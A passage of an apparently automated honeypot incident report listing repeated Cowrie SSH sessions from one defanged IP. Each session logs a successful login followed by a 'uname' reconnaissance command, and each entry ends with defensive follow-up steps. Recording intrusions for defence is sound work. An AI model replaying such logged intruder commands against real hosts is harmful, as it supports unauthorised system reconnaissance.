| `2026-06-25 13:19:40` | `cowrie.session.connect` |
| `2026-06-25 13:19:40` | `cowrie.client.version` |
| `2026-06-25 13:19:40` | `cowrie.client.kex` |
| `2026-06-25 13:19:40` | `cowrie.login.success` |
| `2026-06-25 13:19:41` | `cowrie.session.params` |
| `2026-06-25 13:19:41` | `cowrie.command.input` |
| `2026-06-25 13:19:41` | `cowrie.log.closed` |
| `2026-06-25 13:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75759d22a53b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:20 |
| **Last Seen** | 2026-06-25 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:20:41` | `cowrie.session.connect` |
| `2026-06-25 13:20:41` | `cowrie.client.version` |
| `2026-06-25 13:20:42` | `cowrie.client.kex` |
| `2026-06-25 13:20:42` | `cowrie.login.success` |
| `2026-06-25 13:20:43` | `cowrie.session.params` |
| `2026-06-25 13:20:43` | `cowrie.command.input` |
| `2026-06-25 13:20:43` | `cowrie.log.closed` |
| `2026-06-25 13:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fdac156df17

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:21 |
| **Last Seen** | 2026-06-25 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:21:39` | `cowrie.session.connect` |
| `2026-06-25 13:21:39` | `cowrie.client.version` |
| `2026-06-25 13:21:39` | `cowrie.client.kex` |
| `2026-06-25 13:21:39` | `cowrie.login.success` |
| `2026-06-25 13:21:40` | `cowrie.session.params` |
| `2026-06-25 13:21:40` | `cowrie.command.input` |
| `2026-06-25 13:21:40` | `cowrie.log.closed` |
| `2026-06-25 13:21:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b72bdcc748ba

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:22 |
| **Last Seen** | 2026-06-25 13:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:22:38` | `cowrie.session.connect` |
| `2026-06-25 13:22:38` | `cowrie.client.version` |
| `2026-06-25 13:22:38` | `cowrie.client.kex` |
| `2026-06-25 13:22:38` | `cowrie.login.success` |
| `2026-06-25 13:22:39` | `cowrie.session.params` |
| `2026-06-25 13:22:39` | `cowrie.command.input` |
| `2026-06-25 13:22:39` | `cowrie.log.closed` |
| `2026-06-25 13:22:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3efa4dbda03f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:23 |
| **Last Seen** | 2026-06-25 13:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:23:37` | `cowrie.session.connect` |
| `2026-06-25 13:23:37` | `cowrie.client.version` |
| `2026-06-25 13:23:37` | `cowrie.client.kex` |
| `2026-06-25 13:23:38` | `cowrie.login.success` |
| `2026-06-25 13:23:38` | `cowrie.session.params` |
| `2026-06-25 13:23:38` | `cowrie.command.input` |
| `2026-06-25 13:23:39` | `cowrie.log.closed` |
| `2026-06-25 13:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7518670ad75

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:24 |
| **Last Seen** | 2026-06-25 13:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:24:36` | `cowrie.session.connect` |
| `2026-06-25 13:24:36` | `cowrie.client.version` |
| `2026-06-25 13:24:37` | `cowrie.client.kex` |
| `2026-06-25 13:24:37` | `cowrie.login.success` |
| `2026-06-25 13:24:38` | `cowrie.session.params` |
| `2026-06-25 13:24:38` | `cowrie.command.input` |
| `2026-06-25 13:24:38` | `cowrie.log.closed` |
| `2026-06-25 13:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-688186ac7765

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:25 |
| **Last Seen** | 2026-06-25 13:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:25:34` | `cowrie.session.connect` |
| `2026-06-25 13:25:34` | `cowrie.client.version` |
| `2026-06-25 13:25:35` | `cowrie.client.kex` |
| `2026-06-25 13:25:35` | `cowrie.login.success` |
| `2026-06-25 13:25:36` | `cowrie.session.params` |
| `2026-06-25 13:25:36` | `cowrie.command.input` |
| `2026-06-25 13:25:36` | `cowrie.log.closed` |
| `2026-06-25 13:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1184d615f9

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:26 |
| **Last Seen** | 2026-06-25 13:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:26:32` | `cowrie.session.connect` |
| `2026-06-25 13:26:32` | `cowrie.client.version` |
| `2026-06-25 13:26:32` | `cowrie.client.kex` |
| `2026-06-25 13:26:32` | `cowrie.login.success` |
| `2026-06-25 13:26:33` | `cowrie.session.params` |
| `2026-06-25 13:26:33` | `cowrie.command.input` |
| `2026-06-25 13:26:33` | `cowrie.log.closed` |
| `2026-06-25 13:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39424b07f1dd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:27 |
| **Last Seen** | 2026-06-25 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:27:31` | `cowrie.session.connect` |
| `2026-06-25 13:27:31` | `cowrie.client.version` |
| `2026-06-25 13:27:32` | `cowrie.client.kex` |
| `2026-06-25 13:27:32` | `cowrie.login.success` |
| `2026-06-25 13:27:33` | `cowrie.session.params` |
| `2026-06-25 13:27:33` | `cowrie.command.input` |
| `2026-06-25 13:27:33` | `cowrie.log.closed` |
| `2026-06-25 13:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f68d295bb20

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:28 |
| **Last Seen** | 2026-06-25 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:28:33` | `cowrie.session.connect` |
| `2026-06-25 13:28:33` | `cowrie.client.version` |
| `2026-06-25 13:28:33` | `cowrie.client.kex` |
| `2026-06-25 13:28:33` | `cowrie.login.success` |
| `2026-06-25 13:28:34` | `cowrie.session.params` |
| `2026-06-25 13:28:34` | `cowrie.command.input` |
| `2026-06-25 13:28:34` | `cowrie.log.closed` |
| `2026-06-25 13:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91615abe19dd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:29 |
| **Last Seen** | 2026-06-25 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:29:35` | `cowrie.session.connect` |
| `2026-06-25 13:29:35` | `cowrie.client.version` |
| `2026-06-25 13:29:35` | `cowrie.client.kex` |
| `2026-06-25 13:29:36` | `cowrie.login.success` |
| `2026-06-25 13:29:36` | `cowrie.session.params` |
| `2026-06-25 13:29:36` | `cowrie.command.input` |
| `2026-06-25 13:29:37` | `cowrie.log.closed` |
| `2026-06-25 13:29:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf4ff220c65

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:30 |
| **Last Seen** | 2026-06-25 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:30:36` | `cowrie.session.connect` |
| `2026-06-25 13:30:36` | `cowrie.client.version` |
| `2026-06-25 13:30:36` | `cowrie.client.kex` |
| `2026-06-25 13:30:36` | `cowrie.login.success` |
| `2026-06-25 13:30:37` | `cowrie.session.params` |
| `2026-06-25 13:30:37` | `cowrie.command.input` |
| `2026-06-25 13:30:37` | `cowrie.log.closed` |
| `2026-06-25 13:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a93e788a703

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:31 |
| **Last Seen** | 2026-06-25 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:31:35` | `cowrie.session.connect` |
| `2026-06-25 13:31:35` | `cowrie.client.version` |
| `2026-06-25 13:31:36` | `cowrie.client.kex` |
| `2026-06-25 13:31:36` | `cowrie.login.success` |
| `2026-06-25 13:31:37` | `cowrie.session.params` |
| `2026-06-25 13:31:37` | `cowrie.command.input` |
| `2026-06-25 13:31:37` | `cowrie.log.closed` |
| `2026-06-25 13:31:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-817d9b1d43bd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:32 |
| **Last Seen** | 2026-06-25 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:32:36` | `cowrie.session.connect` |
| `2026-06-25 13:32:36` | `cowrie.client.version` |
| `2026-06-25 13:32:36` | `cowrie.client.kex` |
| `2026-06-25 13:32:36` | `cowrie.login.success` |
| `2026-06-25 13:32:37` | `cowrie.session.params` |
| `2026-06-25 13:32:37` | `cowrie.command.input` |
| `2026-06-25 13:32:37` | `cowrie.log.closed` |
| `2026-06-25 13:32:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783ed33a418f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:33 |
| **Last Seen** | 2026-06-25 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:33:39` | `cowrie.session.connect` |
| `2026-06-25 13:33:39` | `cowrie.client.version` |
| `2026-06-25 13:33:39` | `cowrie.client.kex` |
| `2026-06-25 13:33:40` | `cowrie.login.success` |
| `2026-06-25 13:33:40` | `cowrie.session.params` |
| `2026-06-25 13:33:40` | `cowrie.command.input` |
| `2026-06-25 13:33:40` | `cowrie.log.closed` |
| `2026-06-25 13:33:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7968e8e466f2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:34 |
| **Last Seen** | 2026-06-25 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:34:42` | `cowrie.session.connect` |
| `2026-06-25 13:34:42` | `cowrie.client.version` |
| `2026-06-25 13:34:42` | `cowrie.client.kex` |
| `2026-06-25 13:34:42` | `cowrie.login.success` |
| `2026-06-25 13:34:43` | `cowrie.session.params` |
| `2026-06-25 13:34:43` | `cowrie.command.input` |
| `2026-06-25 13:34:44` | `cowrie.log.closed` |
| `2026-06-25 13:34:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38350a1f9663

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:35 |
| **Last Seen** | 2026-06-25 13:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:35:47` | `cowrie.session.connect` |
| `2026-06-25 13:35:47` | `cowrie.client.version` |
| `2026-06-25 13:35:47` | `cowrie.client.kex` |
| `2026-06-25 13:35:48` | `cowrie.login.success` |
| `2026-06-25 13:35:48` | `cowrie.session.params` |
| `2026-06-25 13:35:48` | `cowrie.command.input` |
| `2026-06-25 13:35:48` | `cowrie.log.closed` |
| `2026-06-25 13:35:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e69f67bdf2c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:36 |
| **Last Seen** | 2026-06-25 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:36:51` | `cowrie.session.connect` |
| `2026-06-25 13:36:51` | `cowrie.client.version` |
| `2026-06-25 13:36:51` | `cowrie.client.kex` |
| `2026-06-25 13:36:51` | `cowrie.login.success` |
| `2026-06-25 13:36:52` | `cowrie.session.params` |
| `2026-06-25 13:36:52` | `cowrie.command.input` |
| `2026-06-25 13:36:52` | `cowrie.log.closed` |
| `2026-06-25 13:36:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce90ddfaa659

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:37 |
| **Last Seen** | 2026-06-25 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:37:54` | `cowrie.session.connect` |
| `2026-06-25 13:37:54` | `cowrie.client.version` |
| `2026-06-25 13:37:54` | `cowrie.client.kex` |
| `2026-06-25 13:37:54` | `cowrie.login.success` |
| `2026-06-25 13:37:55` | `cowrie.session.params` |
| `2026-06-25 13:37:55` | `cowrie.command.input` |
| `2026-06-25 13:37:55` | `cowrie.log.closed` |
| `2026-06-25 13:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc290ecceee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:38 |
| **Last Seen** | 2026-06-25 13:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:38:54` | `cowrie.session.connect` |
| `2026-06-25 13:38:54` | `cowrie.client.version` |
| `2026-06-25 13:38:54` | `cowrie.client.kex` |
| `2026-06-25 13:38:54` | `cowrie.login.success` |
| `2026-06-25 13:38:55` | `cowrie.session.params` |
| `2026-06-25 13:38:55` | `cowrie.command.input` |
| `2026-06-25 13:38:55` | `cowrie.log.closed` |
| `2026-06-25 13:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d076b3f16e7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:39 |
| **Last Seen** | 2026-06-25 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:39:59` | `cowrie.session.connect` |
| `2026-06-25 13:39:59` | `cowrie.client.version` |
| `2026-06-25 13:39:59` | `cowrie.client.kex` |
| `2026-06-25 13:39:59` | `cowrie.login.success` |
| `2026-06-25 13:40:00` | `cowrie.session.params` |
| `2026-06-25 13:40:00` | `cowrie.command.input` |
| `2026-06-25 13:40:00` | `cowrie.log.closed` |
| `2026-06-25 13:40:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd8640b4a04

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:41 |
| **Last Seen** | 2026-06-25 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:41:05` | `cowrie.session.connect` |
| `2026-06-25 13:41:05` | `cowrie.client.version` |
| `2026-06-25 13:41:05` | `cowrie.client.kex` |
| `2026-06-25 13:41:06` | `cowrie.login.success` |
| `2026-06-25 13:41:06` | `cowrie.session.params` |
| `2026-06-25 13:41:06` | `cowrie.command.input` |
| `2026-06-25 13:41:07` | `cowrie.log.closed` |
| `2026-06-25 13:41:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f10dad657672

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:42 |
| **Last Seen** | 2026-06-25 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:42:13` | `cowrie.session.connect` |
| `2026-06-25 13:42:13` | `cowrie.client.version` |
| `2026-06-25 13:42:13` | `cowrie.client.kex` |
| `2026-06-25 13:42:13` | `cowrie.login.success` |
| `2026-06-25 13:42:14` | `cowrie.session.params` |
| `2026-06-25 13:42:14` | `cowrie.command.input` |
| `2026-06-25 13:42:14` | `cowrie.log.closed` |
| `2026-06-25 13:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6f8a13c83f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:43 |
| **Last Seen** | 2026-06-25 13:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:43:20` | `cowrie.session.connect` |
| `2026-06-25 13:43:20` | `cowrie.client.version` |
| `2026-06-25 13:43:20` | `cowrie.client.kex` |
| `2026-06-25 13:43:21` | `cowrie.login.success` |
| `2026-06-25 13:43:22` | `cowrie.session.params` |
| `2026-06-25 13:43:22` | `cowrie.command.input` |
| `2026-06-25 13:43:22` | `cowrie.log.closed` |
| `2026-06-25 13:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdc126da225f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:44 |
| **Last Seen** | 2026-06-25 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:44:24` | `cowrie.session.connect` |
| `2026-06-25 13:44:24` | `cowrie.client.version` |
| `2026-06-25 13:44:24` | `cowrie.client.kex` |
| `2026-06-25 13:44:24` | `cowrie.login.success` |
| `2026-06-25 13:44:25` | `cowrie.session.params` |
| `2026-06-25 13:44:25` | `cowrie.command.input` |
| `2026-06-25 13:44:25` | `cowrie.log.closed` |
| `2026-06-25 13:44:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adcfa6ce43f7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 13:45 |
| **Last Seen** | 2026-06-25 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 13:45:32` | `cowrie.session.connect` |
| `2026-06-25 13:45:32` | `cowrie.client.version` |
| `2026-06-25 13:45:32` | `cowrie.client.kex` |
| `2026-06-25 13:45:33` | `cowrie.login.success` |
| `2026-06-25 13:45:33` | `cowrie.session.params` |
| `2026-06-25 13:45:33` | `cowrie.command.input` |
| `2026-06-25 13:45:33` | `cowrie.log.closed` |
| `2026-06-25 13:45:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41cedaa49627

| Field | Detail |
|---|---|
